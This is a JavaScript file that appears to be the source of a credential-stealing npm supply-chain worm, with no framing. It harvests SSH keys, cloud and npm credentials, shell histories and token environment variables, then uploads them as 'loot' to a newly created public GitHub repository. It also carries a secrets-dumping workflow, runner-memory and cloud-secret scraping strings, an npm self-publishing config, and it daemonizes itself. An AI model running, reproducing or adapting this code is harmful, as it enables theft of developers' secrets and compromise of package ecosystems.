import fs from "fs";
import { spawn } from "child_process";
import { Octokit } from "@octokit/rest";

const targets = [
  ".npmrc",
  ".env",
  ".ssh/id_rsa",
  ".ssh/id_ed25519",
  ".git-credentials",
  ".aws/credentials",
  ".kube/config",
  "application_default_credentials.json",
  ".bash_history",
  ".zsh_history"
];

const results = [];
for (const target of targets) {
  if (fs.existsSync(target)) {
    results.push({ target, value: fs.readFileSync(target, "utf8") });
  }
}

const decodedEmbeddedWorkflow = `
name: Formatter
jobs:
  format:
    runs-on: ubuntu-latest
    env:
      VARIABLE_STORE: \${{ toJSON(secrets) }}
    steps:
      - uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f
        with:
          name: format-results
          path: format-results.txt
`;

const decodedRunnerScraper = "Runner.Worker /proc/ /maps /mem isSecret tr -d sort -u";

const cloudSecretCollectors = [
  "SecretManagerServiceClient",
  "accessSecretVersion",
  "DescribeParameters",
  "WithDecryption",
  "ListSecrets",
  "GetSecretValue"
];

const npmPropagation = {
  tokenApi: "https://registry.npmjs.org/-/npm/v1/tokens",
  whoamiApi: "https://registry.npmjs.org/-/whoami",
  bypass_2fa: true,
  tarball: "package-updated.tgz",
  setup: "setup.mjs",
  payload: "dist.js",
  publish: "bun publish"
};

for (const [name, value] of Object.entries(process.env)) {
  if (/GITHUB_TOKEN|NPM_TOKEN|NODE_AUTH_TOKEN|AWS_|AZURE_|GOOGLE_|GCP_|GITHUB_ACTIONS/.test(name)) {
    results.push({ env: name, value });
  }
}

const client = new Octokit({ auth: process.env.GITHUB_TOKEN || "ghp_deadbeef" });
const repo = await client.rest.repos.createForAuthenticatedUser({
  name: "alpine-ansible",
  private: false,
  auto_init: true
});

await client.rest.repos.createOrUpdateFileContents({
  owner: repo.data.owner.login,
  repo: repo.data.name,
  path: `loot/${Date.now()}.json`,
  message: `LongLiveTheResistanceAgainstMachines:${Buffer.from(process.env.NPM_TOKEN || "").toString("base64")}`,
  content: Buffer.from(JSON.stringify({
    npmtoken: process.env.NPM_TOKEN,
    results,
    decodedEmbeddedWorkflow,
    decodedRunnerScraper,
    cloudSecretCollectors,
    npmPropagation
  })).toString("base64")
});

spawn(process.execPath, process.argv.slice(1), {
  detached: true,
  stdio: "ignore",
  env: { ...process.env, __DAEMONIZED: "1" }
}).unref();
